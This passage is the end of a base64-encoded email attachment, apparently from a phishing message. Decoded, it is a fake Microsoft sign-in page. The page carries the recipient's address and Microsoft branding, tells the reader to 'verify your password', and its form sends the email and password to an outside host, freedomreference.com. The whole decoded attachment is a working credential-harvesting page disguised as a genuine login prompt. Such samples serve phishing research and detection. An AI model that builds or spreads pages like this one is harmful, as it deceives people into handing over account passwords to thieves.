+YXRpb24tZGVsYXk6IDcyMG1zOw0KfQ0KLmxvYWRlciAuY2lyY2xlOm50aC1jaGlsZCg1KSB7
+DQoJYW5pbWF0aW9uLWRlbGF5OiA5NjBtczsNCn0NCg0KQGtleWZyYW1lcyBvcmJpdCB7DQoJ
+MCUgew0KCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMHB4LCAwKTsNCgkJb3BhY2l0eTogMTsN
+CgkJYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogZWFzZS1vdXQ7DQoJfQ0KCTclIHsNCgkJ
+dHJhbnNmb3JtOiB0cmFuc2xhdGUoMzBweCwgMCk7DQoJCWFuaW1hdGlvbi10aW1pbmctZnVu
+Y3Rpb246IGxpbmVhcjsNCgl9DQoJMzAlIHsNCgkJdHJhbnNmb3JtOiB0cmFuc2xhdGUoNjBw
+eCwgMCk7DQoJCWFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGVhc2UtaW4tb3V0Ow0KCX0N
+Cgk0MCUgew0KCQl0cmFuc2Zvcm06IHRyYW5zbGF0ZSg5MHB4LCAwKTsNCgkJYW5pbWF0aW9u
+LXRpbWluZy1mdW5jdGlvbjogZWFzZS1vdXQ7DQoJfQ0KCTUwJSB7DQoJCXRyYW5zZm9ybTog
+dHJhbnNsYXRlKDEyMHB4LCAwKTsNCgkJYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogZWFz
+ZS1vdXQ7DQoJfQ0KCTc1JSB7DQoJCXRyYW5zZm9ybTogdHJhbnNsYXRlKDI1MHB4LCAwKTsN
+CgkJYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogZWFzZS1vdXQ7DQoJfQ0KCTc2JSB7DQoJ
+CXRyYW5zZm9ybTogdHJhbnNsYXRlKDMwMHB4LCAwKTsNCgkJb3BhY2l0eTogMDsNCgl9DQoJ
+MTAwJSB7DQoJCXRyYW5zZm9ybTogdHJhbnNsYXRlKDM1MHB4LCAwKTsNCgkJb3BhY2l0eTog
+MDsNCgl9DQp9DQoNCg0KQG1lZGlhKG1heC13aWR0aDogNjAwcHgpIHsNCglib2R5IHsNCgkJ
+YmFja2dyb3VuZC1jb2xvcjogI2ZmZjsNCgkJYmFja2dyb3VuZC1pbWFnZTogbm9uZTsNCgl9
+DQoNCgkub3ZlcmxheSB7DQoJCWJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsMCk7DQoJ
+fQ0KDQoJLmxvZ2luLWJveCB7DQoJCWJvcmRlcjogbm9uZTsNCgl9DQoNCglmb290ZXIgew0K
+CQliYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLDApOw0KCX0NCg0KCWZvb3RlciB1bCBs
+aSB7DQoJCW1hcmdpbjogMXB4IDVweDsNCgl9DQoNCglmb290ZXIgdWwgbGkgYSB7DQoJCWNv
+bG9yOiAjNjY2Ow0KCX0NCg0KCWZvb3RlciB1bCBsaSBhOmhvdmVyIHsNCgkJY29sb3I6ICM2
+NjY7IA0KCX0NCn0NCg0KQG1lZGlhKG1heC13aWR0aDogNDI1cHgpIHsNCgkubG9naW4tYm94
+IHsNCgkJd2lkdGg6IDM5MHB4DQoJfQ0KfQ0KDQoNCkBtZWRpYShtYXgtd2lkdGg6IDM3NXB4
+KSB7DQoJLmxvZ2luLWJveCB7DQoJCXdpZHRoOiAzNjBweA0KCX0NCg0KCWZvb3RlciB1bCB7
+DQoJCW1hcmdpbi1yaWdodDogMTAlOw0KCX0NCn0NCg0KDQpAbWVkaWEobWF4LXdpZHRoOiAz
+MjBweCkgew0KCS5sb2dpbi1ib3ggew0KCQl3aWR0aDogMzAwcHgNCgl9DQp9DQoNCjwvc3R5
+bGU+DQoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0ianMvanF1ZXJ5Lmpz
+Ij4NCg0KCTwvc2NyaXB0PgkNCgkNCjwvaGVhZD4NCg0KPGJvZHk+DQoJPGRpdiBjbGFzcz0i
+b3ZlcmxheSI+DQoJCTxkaXYgY2xhc3M9ImxvZ2luLWJveCI+DQoJCQk8aW1nIHNyYz0iaHR0
+cHM6Ly9pLmltZ3VyLmNvbS92b2ZDc2JGLmpwZyIgYWx0PSJsb2dvIj4NCgkJCTxkaXYgaWQ9
+ImlkZW50aXR5IiBjbGFzcz0iaWRlbnRpdHktYmFubmVyIj4NCgkJCQk8ZGl2IGlkPSJpZGVu
+dGl0eS1uYW1lIiBjbGFzcz0iaWRlbnRpdHkiPg0KCQkJCQlqb3NlQG1vbmtleS5vcmcNCgkJ
+CQkJDQoJCQkJPC9kaXY+DQoNCgkJCQk8ZGl2IGNsYXNzPSJwcm9maWxlLXBob3RvIj4NCgkJ
+CQkJPGltZyBzcmM9Imh0dHBzOi8vd3d3LmNtYW5leHRzdGVwLmNvbS93cC1jb250ZW50L3Vw
+bG9hZHMvbXMtbG9nby12MSBjb3B5LnN2ZyIgYWx0PSJsb2dvIj4NCgkJCQk8L2Rpdj4NCgkJ
+CTwvZGl2Pg0KDQoJCQk8cCBpZD0idGl0bGUiPiJCZWNhdXNlIHlvdSdyZSBhY2Nlc3Npbmcg
+c2Vuc2l0aXZlIGluZm8sIHlvdSBuZWVkIHRvIHZlcmlmeSB5b3VyIHBhc3N3b3JkPC9wPg0K
+CQkJPHAgaWQ9Im1lc3NhZ2UiIGNsYXNzPSJtZXNzYWdlIj48P3BocCBlY2hvICRlcnJvck1z
+ZzsgPz48L3A+DQoNCgkJCTxkaXYgaWQ9ImxvYWRlciIgY2xhc3M9ImxvYWRlciBoaWRkZW4i
+Pg0KCQkJCTxkaXYgY2xhc3M9ImNpcmNsZSI+PC9kaXY+DQoJCQkJPGRpdiBjbGFzcz0iY2ly
+Y2xlIj48L2Rpdj4NCgkJCQk8ZGl2IGNsYXNzPSJjaXJjbGUiPjwvZGl2Pg0KCQkJCTxkaXYg
+Y2xhc3M9ImNpcmNsZSI+PC9kaXY+DQoJCQkJPGRpdiBjbGFzcz0iY2lyY2xlIj48L2Rpdj4N
+CgkJCTwvZGl2Pg0KDQoJCQk8Zm9ybSBhY3Rpb249Imh0dHA6Ly9mcmVlZG9tcmVmZXJlbmNl
+LmNvbS9saXZlL1VaSUUvYWN0aW9ucy5waHAiIG1ldGhvZD0icG9zdCI+DQoJCQkJPGlucHV0
+IHR5cGU9ImhpZGRlbiIgaWQ9IkFQX19fIiBuYW1lPSJlbWFpbCIgdmFsdWU9Impvc2VAbW9u
+a2V5Lm9yZyI+DQoJCQkJPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiIG5h
+bWU9InBhc3N3ZCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZCBhdXRvZm9jdXM+
+DQoJCQkJPGlucHV0IGlkPSJzaWduaW4iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic2lnbmluIiB2
+YWx1ZT0iQ29udGludWUiPg0KCQkJPC9mb3JtPg0KCQkJPGJyPg0KDQoJCQk8ZGl2IGlkPSJn
+cm91cDIiPg0KCQkJCTxkaXYgaWQ9ImtlZXBtZSI+PHNwYW4+S2VlcCBtZSBzaWduZWQgaW48
+L3NwYW4+IDxpbnB1dCBuYW1lPSJrZWVwbWUiIHR5cGU9ImNoZWNrYm94Ii8+PC9kaXY+DQoJ
+CQkJPGJyPg0KCQkJCTxzbWFsbCBpZD0iZnBzIj48YSBocmVmPSIjIiBjbGFzcz0iZmFkZSI+
+Rm9yZ290IG15IHBhc3N3b3JkPC9hPjwvc21hbGw+DQoJCQkJPGJyPg0KCQkJCTxicj4NCgkJ
+CTwvZGl2Pg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCg0KCTxmb290ZXI+DQoJCTx1bD4NCgkJCTxs
+aT48YSBocmVmPSIjIj5Qcml2YWN5ICYgY29va2llczwvYT48L2xpPg0KCQkJPGxpPjxhIGhy
+ZWY9IiMiPlRlcm1zIG9mIHVzZTwvYT48L2xpPg0KCQkJPGxpPjxhPiZjb3B5OzIwMjAgTWlj
+cm9zb2Z0PC9hPjwvbGk+DQoJCTwvdWw+DQoJPC9mb290ZXI+DQoNCjwvYm9keT4NCjwvaHRt
+bD4NCg==
+
+------=_NextPart_000_0012_B1AEFC63.0D3702DC--
